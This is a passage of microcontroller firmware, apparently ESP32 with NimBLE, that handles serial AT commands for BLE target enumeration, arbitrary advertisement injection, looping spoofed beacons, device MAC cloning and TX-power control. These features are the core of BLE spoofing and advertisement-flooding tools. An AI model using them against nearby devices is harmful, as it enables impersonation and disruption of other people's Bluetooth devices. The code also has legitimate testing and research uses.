    sc->setActiveScan(true); sc->setInterval(100); sc->setWindow(99);
    Serial.println("OK:BLEENUM:" + target);
    sc->start(s, false);
    Serial.println("OK:BLEEENUMDONE");
  }

  // ── Custom ADV ─────────────────────────────────────────────────
  else if (u.startsWith("AT+ADV=")) {
    String h = c.substring(7);
    uint8_t b[31]; int n = 0;
    for (unsigned int i = 0; i + 1 < h.length() && n < 31; i += 2)
      b[n++] = (uint8_t)strtol(h.substring(i, i + 2).c_str(), NULL, 16);
    txPayload(b, n);
    Serial.println("OK:ADV:" + String(n));
  }

  // ── Beacon ─────────────────────────────────────────────────────
  else if (u.startsWith("AT+BEACON=")) {
    String p = c.substring(10);
    int cm = p.indexOf(',');
    beaconName = p.substring(0, cm > 0 ? cm : p.length());
    int dur = cm > 0 ? p.substring(cm + 1).toInt() : 0;
    uint8_t buf[33]; uint8_t nlen = min((int)beaconName.length(), 29);
    buf[0] = nlen + 1; buf[1] = 0x09;
    memcpy(&buf[2], beaconName.c_str(), nlen);
    NimBLEAdvertisementData ad;
    ad.addData(buf, nlen + 2);
    pAdv->stop();
    pAdv->setAdvertisementData(ad);
    pAdv->setScanResponseData(NimBLEAdvertisementData());
    pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    pAdv->start();
    beaconActive = true;
    beaconLoop   = false;
    beaconEnd    = dur > 0 ? millis() + (unsigned long)dur * 1000UL : 0;
    Serial.println("OK:BEACON:" + beaconName + ":" + String(dur));
  }
  else if (u == "AT+BEACONSTOP") {
    beaconActive = false; beaconLoop = false;
    pAdv->stop();
    Serial.println("OK:BEACONSTOP");
  }
  else if (u.startsWith("AT+BEACONLOOP=")) {
    // AT+BEACONLOOP=name,interval_ms
    String p = c.substring(14);
    int cm = p.indexOf(',');
    beaconName     = p.substring(0, cm > 0 ? cm : p.length());
    beaconInterval = cm > 0 ? constrain(p.substring(cm + 1).toInt(), 50, 5000) : 200;
    uint8_t buf[33]; uint8_t nlen = min((int)beaconName.length(), 29);
    buf[0] = nlen + 1; buf[1] = 0x09;
    memcpy(&buf[2], beaconName.c_str(), nlen);
    NimBLEAdvertisementData ad;
    ad.addData(buf, nlen + 2);
    pAdv->stop();
    pAdv->setAdvertisementData(ad);
    pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    beaconActive = true;
    beaconLoop   = true;
    beaconEnd    = 0;  // run until AT+STOP
    Serial.println("OK:BEACONLOOP:" + beaconName + ":" + String(beaconInterval));
  }

  // ── MAC Clone ──────────────────────────────────────────────────
  else if (u.startsWith("AT+MACCLONE=")) {
    // AT+MACCLONE=XX:XX:XX:XX:XX:XX — set static MAC for next ADV packets
    String mac = c.substring(12); mac.trim();
    if (mac == "RANDOM" || mac == "OFF") {
      useMacClone = false;
      Serial.println("OK:MACCLONE:RANDOM");
    } else if (mac.length() >= 17) {
      for (int i = 0; i < 6; i++) {
        cloneMac[i] = (uint8_t)strtol(mac.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
      }
      cloneMac[5] = (cloneMac[5] | 0xC0) & 0xFE;  // static random + unicast
      useMacClone = true;
      Serial.println("OK:MACCLONE:" + mac);
    } else {
      Serial.println("ERR:MACCLONE:invalid format XX:XX:XX:XX:XX:XX");
    }
  }

  // ── TX Power ───────────────────────────────────────────────────
  else if (u.startsWith("AT+SETPOWER=")) {
    txPowerLevel = constrain(c.substring(12).toInt(), 0, 9);
    applyTxPower();
    Serial.println("OK:SETPOWER:" + String(txPowerLevel));
  }

  // ── RSSI Filter ────────────────────────────────────────────────
  else if (u.startsWith("AT+RSSI=")) {
    rssiFilter = (int8_t)constrain(c.substring(8).toInt(), -127, 0);
    Serial.println("OK:RSSI:" + String(rssiFilter));
  }

  else {
    Serial.println("ERR:" + c);
  }
}
